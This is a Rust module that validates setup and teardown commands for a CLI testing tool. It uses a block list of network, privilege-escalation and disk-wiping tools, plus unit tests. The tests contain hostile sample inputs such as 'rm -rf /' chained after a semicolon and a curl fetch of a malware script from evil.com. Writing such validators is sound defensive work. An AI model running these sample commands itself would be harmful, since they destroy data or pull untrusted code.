//! Configuration validation and security checks
//!
//! This module provides multi-layered security validation for setup commands
//! and other potentially dangerous configuration options.

use crate::error::CliTestError;
use crate::types::config::CliTestConfig;

/// Forbidden command patterns that indicate security risks
const FORBIDDEN_PATTERNS: &[&str] = &[
    "|", ";", "&&", "||", // Command chaining
    "`", "$(", "$(", // Command substitution
    "sudo", "su", // Privilege escalation
    "curl", "wget", "nc", // Network access
    "mkfs", "dd", // Disk operations
    ">", ">>", // Output redirection (potential data loss)
];

/// Dangerous deletion patterns (checked separately with word boundaries)
const DANGEROUS_RM_PATTERNS: &[&str] = &["rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf $HOME"];

/// Allowed commands in setup/teardown (whitelist)
const ALLOWED_COMMANDS: &[&str] = &[
    "mkdir", "touch", "rm", "cp", "mv", "echo", "cat", "ls", "pwd", "cd", "chmod",
    "chown", // File permissions (with validation)
];

/// Maximum command length to prevent abuse
const MAX_COMMAND_LENGTH: usize = 200;

/// Validate entire configuration file
pub fn validate_config(config: &CliTestConfig) -> Result<(), CliTestError> {
    // Validate schema version
    validate_version(&config.version)?;

    // Validate setup/teardown commands if present
    if let Some(ref dir_traversal) = config.test_adjustments.directory_traversal {
        validate_setup_commands(&dir_traversal.setup_commands)?;
        validate_teardown_commands(&dir_traversal.teardown_commands)?;
    }

    Ok(())
}

/// Validate schema version
fn validate_version(version: &str) -> Result<(), CliTestError> {
    match version {
        "1.0" => Ok(()),
        v => Err(CliTestError::Config(format!(
            "Unsupported config version '{}'. Supported versions: 1.0",
            v
        ))),
    }
}

/// Validate setup commands (Layer 2: Command Validation)
pub fn validate_setup_commands(commands: &[String]) -> Result<(), CliTestError> {
    for cmd in commands {
        validate_command(cmd, "setup")?;
    }
    Ok(())
}

/// Validate teardown commands (Layer 2: Command Validation)
pub fn validate_teardown_commands(commands: &[String]) -> Result<(), CliTestError> {
    for cmd in commands {
        validate_command(cmd, "teardown")?;
    }
    Ok(())
}

/// Validate a single command
fn validate_command(cmd: &str, context: &str) -> Result<(), CliTestError> {
    // Check 1: Length limit
    if cmd.len() > MAX_COMMAND_LENGTH {
        return Err(CliTestError::Config(format!(
            "{} command too long ({} chars, max {}): {}",
            context,
            cmd.len(),
            MAX_COMMAND_LENGTH,
            truncate(cmd, 50)
        )));
    }

    // Check 2: Forbidden patterns
    for pattern in FORBIDDEN_PATTERNS {
        if cmd.contains(pattern) {
            return Err(CliTestError::Config(format!(
                "{} command contains forbidden pattern '{}': {}",
                context,
                pattern,
                truncate(cmd, 50)
            )));
        }
    }

    // Check 2b: Dangerous rm patterns (check for root deletion only)
    let trimmed = cmd.trim();
    for pattern in DANGEROUS_RM_PATTERNS {
        // Check if command is exactly the dangerous pattern or followed by whitespace/end
        if trimmed == *pattern
            || trimmed.starts_with(&format!("{} ", pattern))
            || trimmed.starts_with(&format!("{}&&", pattern))
            || trimmed.starts_with(&format!("{};", pattern))
        {
            return Err(CliTestError::Config(format!(
                "{} command contains dangerous deletion pattern '{}': {}",
                context,
                pattern,
                truncate(cmd, 50)
            )));
        }
    }

    // Check 3: Allowed commands (optional, can be disabled with --allow-unsafe-commands)
    let first_word = cmd.split_whitespace().next().unwrap_or("");
    if !first_word.is_empty() && !ALLOWED_COMMANDS.contains(&first_word) {
        return Err(CliTestError::Config(format!(
            "{} command '{}' not in allowlist. Use --allow-unsafe-commands to override.\nAllowed commands: {}",
            context,
            first_word,
            ALLOWED_COMMANDS.join(", ")
        )));
    }

    Ok(())
}

/// Truncate string for error messages
fn truncate(s: &str, max_len: usize) -> String {
    if s.len() <= max_len {
        s.to_string()
    } else {
        format!("{}...", &s[..max_len])
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_safe_commands() {
        assert!(validate_command("mkdir -p /tmp/test", "setup").is_ok());
        assert!(validate_command("touch /tmp/test/file.txt", "setup").is_ok());
        assert!(validate_command("rm -rf /tmp/test", "teardown").is_ok());
    }

    #[test]
    fn test_forbidden_pipe() {
        let result = validate_command("ls | grep test", "setup");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("forbidden pattern '|'"));
    }

    #[test]
    fn test_forbidden_semicolon() {
        let result = validate_command("mkdir /tmp/test; rm -rf /", "setup");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("forbidden pattern ';'"));
    }

    #[test]
    fn test_forbidden_command_substitution() {
        let result = validate_command("mkdir $(whoami)", "setup");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("forbidden pattern '$('"));
    }

    #[test]
    fn test_forbidden_sudo() {
        let result = validate_command("sudo mkdir /tmp/test", "setup");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("forbidden pattern 'sudo'"));
    }

    #[test]
    fn test_forbidden_curl() {
        let result = validate_command("curl http://evil.com/malware.sh", "setup");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("forbidden pattern 'curl'"));
    }

    #[test]
    fn test_dangerous_rm() {
        // Dangerous root deletions should fail
        let result = validate_command("rm -rf /", "teardown");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("dangerous deletion pattern"));

        let result = validate_command("rm -rf /*", "teardown");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("dangerous deletion pattern"));

        let result = validate_command("rm -rf ~", "teardown");
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("dangerous deletion pattern"));

        // Safe deletions should pass
        assert!(validate_command("rm -rf /tmp/test", "teardown").is_ok());
        assert!(validate_command("rm -rf /var/tmp/myapp", "teardown").is_ok());
    }

    #[test]
    fn test_command_too_long() {
        let long_cmd = "mkdir ".to_string() + &"a".repeat(200);
        let result = validate_command(&long_cmd, "setup");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("too long"));
    }

    #[test]
    fn test_not_in_allowlist() {
        let result = validate_command("python3 script.py", "setup");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not in allowlist"));
    }

    #[test]
    fn test_empty_command() {
        let result = validate_command("", "setup");
        assert!(result.is_ok()); // Empty commands are allowed (will be skipped)
    }

    #[test]
    fn test_validate_version() {
        assert!(validate_version("1.0").is_ok());
        assert!(validate_version("2.0").is_err());
        assert!(validate_version("invalid").is_err());
    }

    #[test]
    fn test_validate_setup_commands() {
        let commands = vec![
            "mkdir -p /tmp/test".to_string(),
            "touch /tmp/test/file.txt".to_string(),
        ];
        assert!(validate_setup_commands(&commands).is_ok());

        let bad_commands = vec![
            "mkdir /tmp/test".to_string(),
            "curl http://evil.com".to_string(),
        ];
        assert!(validate_setup_commands(&bad_commands).is_err());
    }

    #[test]
    fn test_truncate() {
        assert_eq!(truncate("short", 10), "short");
        assert_eq!(truncate("this is a very long string", 10), "this is a ...");
    }
}
